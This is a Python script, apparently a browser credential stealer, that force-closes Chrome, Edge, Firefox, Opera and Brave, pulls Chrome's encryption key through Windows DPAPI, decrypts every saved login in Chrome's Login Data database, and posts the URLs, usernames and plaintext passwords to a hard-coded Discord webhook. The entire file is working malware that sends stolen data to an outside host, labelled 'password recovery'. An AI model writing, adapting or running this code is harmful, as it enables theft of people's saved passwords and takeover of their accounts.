import os
import json
import sqlite3
import shutil
import base64
import requests
import win32crypt
from Crypto.Cipher import AES

# ===== CONFIG =====
WEBHOOK_URL = "https://discord.com/api/webhooks/1405228801662783488/tkfBFnAtLbiZiVfDqehFSHO0xKDXTO49gIeUpPKANXQhse2yMIwvIAZRFyDT1VZhG0u4"  # REPLACE IF NEEDED
MAX_RETRIES = 3  # Retry failed webhook sends
TEMPFILE = "chrome_temp.db"  # Temporary database copy

# ===== FUNCTIONS =====
def kill_browsers():
    browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe"]
    for browser in browsers:
        os.system(f"taskkill /f /im {browser} >nul 2>&1")

def get_encryption_key():
    """Extract Chrome's AES encryption key using Windows DPAPI"""
    try:
        local_state_path = os.path.join(
            os.environ['USERPROFILE'],
            r"AppData\Local\Google\Chrome\User Data\Local State"
        )
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"[!] Failed to get encryption key: {str(e)}")
        return None

def decrypt_password(encrypted_password, key):
    """Decrypt Chrome passwords using AES-GCM or DPAPI fallback"""
    try:
        # Chrome v80+ uses AES-GCM encryption
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v20'):
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        
        # Older Chrome versions use DPAPI
        return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return "[DECRYPTION FAILED]"

def extract_passwords():
    """Extract and decrypt all Chrome passwords"""
    passwords = []
    key = get_encryption_key()
    if not key:
        return passwords

    try:
        # Copy Chrome's SQLite database to avoid locks
        login_db = os.path.join(
            os.environ['USERPROFILE'],
            r"AppData\Local\Google\Chrome\User Data\Default\Login Data"
        )
        shutil.copy2(login_db, TEMPFILE)

        # Query stored passwords
        conn = sqlite3.connect(TEMPFILE)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, username, encrypted in cursor.fetchall():
            if not encrypted:
                continue
            decrypted = decrypt_password(encrypted, key)
            passwords.append({
                "URL": url,
                "Username": username,
                "Password": decrypted
            })

        cursor.close()
        conn.close()
    except Exception as e:
        print(f"[!] Database error: {str(e)}")
    finally:
        try:
            os.remove(TEMPFILE)
        except:
            pass

    return passwords

def send_to_webhook(data):
    """Send data to Discord webhook with retries"""
    if not data:
        return False

    payload = {
        "username": "CHROME PASSWORD RECOVERY",
        "content": f"**Extracted {len(data)} passwords**",
        "embeds": [{
            "title": "Decrypted Credentials",
            "description": f"```json\n{json.dumps(data, indent=2, ensure_ascii=False)}\n```",
            "color": 0xFF0000
        }]
    }

    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=15
            )
            if response.status_code == 204:
                return True
            print(f"[!] Webhook error (attempt {attempt+1}): HTTP {response.status_code}")
        except Exception as e:
            print(f"[!] Failed to send (attempt {attempt+1}): {str(e)}")
    
    return False

# ===== MAIN =====
if __name__ == "__main__":
    # 1. Kill browsers to unlock database
    kill_browsers()

    # 2. Extract and decrypt passwords
    print("[*] Extracting Chrome passwords...")
    passwords = extract_passwords()
    
    if not passwords:
        print("[!] No passwords extracted - Chrome may not be installed")
        exit()

    # 3. Send to Discord webhook
    print(f"[*] Sending {len(passwords)} passwords to webhook...")
    if send_to_webhook(passwords):
        print("[+] Successfully sent data to webhook!")
    else:
        print("[!] Failed to send after multiple attempts. Check webhook URL!")
